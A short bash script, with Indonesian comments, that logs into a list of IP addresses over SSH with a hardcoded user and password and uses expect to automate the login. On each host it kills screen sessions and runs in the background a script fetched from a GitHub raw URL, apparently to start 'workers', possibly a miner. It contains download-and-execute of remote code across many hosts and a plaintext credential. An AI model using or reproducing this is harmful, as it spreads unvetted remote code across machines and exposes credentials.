#!/bin/bash

KON="$1"

USER="cloudsigma"
PASSWORD="Dotaja123@HHHH"
BECEK="gulamf.sh"
URLDOT="https://raw.githubusercontent.com/DOT-SUNDA/dot-lun/refs/heads/main"
COMMAND="pkill screen; nohup bash -c 'bash <(wget -qO- $URLDOT/$BECEK)' $KON > /dev/null 2>&1"

IPS="$0"

IFS=',' read -ra IP_LIST <<< "$IPS"

# Baca IP dari file.txt
for IP in "${IP_LIST[@]}"; do
    clear
    echo "Is Running Worker $IP..."
    /usr/bin/expect << EOF > /dev/null 2>&1
    set timeout 5
    spawn ssh $USER@$IP
    expect {
        "*yes/no*" { send "yes\r"; exp_continue }
        "*assword:*" { send "$PASSWORD\r"; exp_continue }
    }
    expect "$"  # Prompt yang menandakan login berhasil
    send "$COMMAND\r"
    expect "$"  # Tunggu sampai perintah selesai
    send "exit\r"
    expect eof
EOF
done
